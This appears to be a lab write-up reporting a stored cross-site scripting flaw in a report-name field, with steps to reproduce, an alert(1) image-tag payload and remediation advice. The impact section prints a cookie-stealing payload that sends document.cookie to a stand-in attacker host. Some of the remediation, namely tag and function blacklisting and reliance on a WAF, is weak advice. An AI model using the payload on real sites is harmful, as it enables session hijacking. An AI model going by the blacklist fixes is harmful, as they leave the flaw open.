---

## Title
Stored Cross-Site Scripting (XSS) via Report Name Field in Network Reports

---

## Vulnerability Type
Stored XSS

---

## Summary

The "Report Name" input field in the Network Reports section does not sanitize or encode user-supplied input before storing it in the database and later rendering it back to users. This means any JavaScript payload entered as a report name gets saved and then executed in the browser of every authenticated user who visits the Reports page — not just the attacker.

---

## Vulnerable Endpoint

```
https://kzlabs.com/60.php
```

**Vulnerable Parameter:** Report Name field (input field inside the "New Network Report" form)

---

## Steps to Reproduce

1. Log in to the application at `https://kzlabs.com/60.php`
2. Navigate to the **Reports** tab.
3. Click on **+ New Network Report**.
4. In the **Report Name** field, enter the following payload:

```
tix5uni'"><img src=x onerror=alert(1)>
```

5. Fill in the remaining required fields and click submit
6. Once the report is saved, you are redirected back to the Network Reports listing page.
7. Observe that a JavaScript alert box fires — confirming that the script executed.
8. Every authenticated user who loads this page will trigger the same alert.

---

## Payload Used

```
tix5uni'"><img src=x onerror=alert(1)>
```

---

## Proof of Concept

**Screenshot 1** — Entering payload in **Report Name** and click Run and save Report 

<img width="1005" height="801" alt="lab-60" src="https://github.com/user-attachments/assets/5131a18e-7dce-4516-8d73-7c4a4a2177cd" />


**Screenshot 1** — Used an img tag payload `'"><img src=x onerror=a>lert(1)` the alert triggered on page load, which confirms any HTML payload gets executed.

<img width="1302" height="421" alt="lab60_" src="https://github.com/user-attachments/assets/d19ab239-7f97-4331-b760-3719df82497d" />


---

## Impact

- Every authenticated user who visits the reports page gets the payload executed in their browser automatically
- Full account takeover without needing passwords
- Real attack payload would be:
<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
- This silently sends the victim's session cookie to the attacker's server
- Attacker pastes that cookie into their browser and is immediately logged in as the victim — no password needed

---

## Remediation

1. Filter out HTML tags like `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
3. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
4. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
